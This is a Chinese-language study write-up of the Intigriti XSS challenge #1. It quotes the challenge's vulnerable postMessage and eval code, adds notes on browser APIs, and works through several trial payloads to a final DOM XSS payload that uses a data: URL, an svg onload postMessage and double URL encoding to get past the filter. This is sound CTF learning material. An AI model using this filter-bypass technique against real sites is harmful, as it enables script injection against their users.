https://blog.intigriti.com/2019/05/06/intigriti-xss-challenge-1/ 解答

https://xz.aliyun.com/t/5106

https://www.anquanke.com/post/id/178041

https://challenge.intigriti.io/  题目

> Try to exploit a DOM XSS vulnerability on this page to trigger a popup of the document.domain (**challenge.intigriti.io**).
> The winner gets a **Burp License (1 year), an exclusive swag package and invitations to private programs**. 

```javascript
  <!-- challenge -->
  <script>
  const url = new URL(decodeURIComponent(document.location.hash.substr(1))).href.replace(/script|<|>/gi, "forbidden");
  const iframe = document.createElement("iframe"); iframe.src = url; document.body.appendChild(iframe);
  iframe.onload = function(){ window.addEventListener("message", executeCtx, false);}
  function executeCtx(e) {
    if(e.source == iframe.contentWindow){
        //https://stackoverflow.com/questions/15329710/postmessage-source-iframe
        //如果只是验证是否是iframe发送的，为什么不加载外部js？
      e.data.location = window.location;
      Object.assign(window, e.data);
      eval(url);
    }
  }
  </script>
  <!-- challenge -->
```

URL 的用法：https://developer.mozilla.org/en-US/docs/Web/API/URL/URL

```
/script|<|>/gi   script < > g全局搜索 i不区分大小写
```

```
Target.addEventListener(时间消息字符串，监听器，)

message 通过WebSocket接收到一条消息 
https://developer.mozilla.org/en-US/docs/Web/API/Window/postMessage 教程
otherWindow can listen for dispatched messages by executing the following JavaScript:
window.addEventListener("message", receiveMessage, false);

function receiveMessage(event) {
  if (event.origin !== "http://example.org:8080")
    return;

  // ...
}
消息的属性
data
The object passed from the other window.
source
A reference to the window object that sent the message; you can use this to establish two-way communication between two windows with different origins.

window.postMessage() 方法可以安全地实现跨源通信。
```

```
Object.assign(target, source) 方法用于将所有可枚举属性的值从一个或多个源对象复制到目标对象。它将返回目标对象。
target source
```

```
contentWindow属性返回<iframe>元素的Window对象。你可以使用这个Window对象来访问iframe的文档及其内部DOM。contentWindow为只读，但是可以像操作全局Window对象一样操作其属性。
```

```
Data URLs，即前缀为 data: 协议的的URL，其允许内容创建者向文档中嵌入小文件。
data:[<mediatype>][;base64],<data>
mediatype 是个 MIME 类型的字符串，例如 "image/jpeg" 表示 JPEG 图像文件。如果被省略，则默认值为 text/plain;charset=US-ASCII
https://developer.mozilla.org/zh-CN/docs/Web/HTTP/data_URIs
```

```
Window 对象表示一个浏览器窗口或一个框架。
Window 对象的 window 属性和 self 属性引用的都是它自己。当你想明确地引用当前窗口，而不仅仅是隐式地引用它时，可以使用这两个属性。除了这两个属性之外，parent 属性、top 属性以及 frame[] 数组都引用了与当前 Window 对象相关的其他 Window 对象。
```

```
Cannot read property 'appendChild' of null
你的JS写在head里面，取body里面的某一节点，这时候是取不到的。这种情况的解决方法：把JS代码放到后面 
```

### 测试代码

```
<html>
<body>
</body>
  <!-- challenge -->
  <script>
  const url = new URL(decodeURIComponent("data:,Hello%2C%20World!"));
  const iframe = document.createElement("iframe"); 
  iframe.src = url; 
  iframe.setAttribute('width','300px'); 
  iframe.setAttribute('height','300px');
  document.body.appendChild(iframe);
  </script>
  <!-- challenge -->
</html>


<script>
  const url = new URL(decodeURIComponent("data:text/html,<script>alert(1)</script>"));
  会先闭合<script>
  
data:text/html;base64,Jmx0O3NjcmlwdCZndDthbGVydCgxKSZsdDsvc2NyaXB0Jmd0Ow%3d%3d 
并不会执行javascript，解码：<script>alert(1)</script> 发生了转义
这一段放在<a src=></a>就可以
data:text/javascript;base64,Jmx0O3NjcmlwdCZndDthbGVydCgxKSZsdDsvc2NyaXB0Jmd0Ow%3d%3d 也不执行
application/xhtml+xml也不行

data:text/html,alert()//<svg/onload='alert(1);'> 却可以
data:text/html,<script>alert(1)</script> 也可以！
```

哪些content-type会执行javascript：https://stackoverflow.com/questions/4741438/what-content-types-execute-javascript-in-the-browser

```
构造 postMessage
postMessage({'location':''},'*');
data:text/html,<script>postMessage({'location':''},'*');</script> # 不满足if的source判断，原因：e.source == iframe.contentWindow.parent 才是true
data:text/html,alert(document.domain);//<script>parent.postMessage({text:4,html:1},'*');</script> # 也不行
data:text/html,alert(document.domain);//<svg onload="parent.postMessage({text:4,html:1},'*');"/> # 测试成功
之后想办法（通过二次url编码即可）绕过正则replace

似乎<script>里无论怎么样e.source都是顶级window，而svg里的是iframe的子window，绕过不加parent也是顶级window？

data:text/html,alert(document.domain);//<script>window.parent.postMessage({'location':'x'},'*');</script>
```

![1557675510034](C:\Users\saferman\AppData\Roaming\Typora\typora-user-images\1557675510034.png)

 上面测试不行的情况<script>

![1557675627896](C:\Users\saferman\AppData\Roaming\Typora\typora-user-images\1557675627896.png)上面测试成功的情况<svg>

使用chrome调试成功的payload

```
https://challenge.intigriti.io/#data:text/html,alert(document.domain);//%253csvg%20onload=%22parent.postMessage({text:4,html:1},'*');%22%253e
解码原型：data:text/html,alert(document.domain);//<svg onload="parent.postMessage({text:4,html:1},'*');">
由于过滤机制，如果没有过滤机制原型也可以，需要二次url编码

{text:4,html:1}的作用是在Object.assign步骤使得window属性有text html取值，这样eval就不会出错
保证text/html的变量有取值，eval不出错：Uncaught ReferenceError: text is not defined
// 的作用是避免执行到Unexpected token %
eval("data:1"); 正常   eval("data");显示未定义

https://challenge.intigriti.io/#data:text/html,alert(document.domain);//%253csvg%20onload=%22parent.postMessage({text:4,html:1},'*');%22%253e
<script>
```

